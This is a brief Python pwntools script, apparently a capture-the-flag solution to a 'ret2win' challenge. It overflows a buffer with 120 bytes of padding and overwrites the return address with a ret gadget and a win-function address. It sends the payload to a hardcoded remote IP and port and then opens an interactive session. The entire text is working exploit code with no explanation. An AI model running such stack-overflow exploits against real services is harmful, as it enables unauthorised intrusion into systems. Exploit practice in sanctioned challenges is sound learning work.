from pwn import *

binary = './ret2win'
elf = context.binary = ELF(binary)
context.log_level = 'DEBUG'
#p = process(binary)
p = remote('103.185.44.122',19000)
rop = ROP(binary)
payload = b'a'*120
#payload += p64(0x40101a)
payload += p64(0x000000000040101a)
payload+= p64(0x0000000000401216)
p.sendlineafter(b': ',payload)
p.interactive()

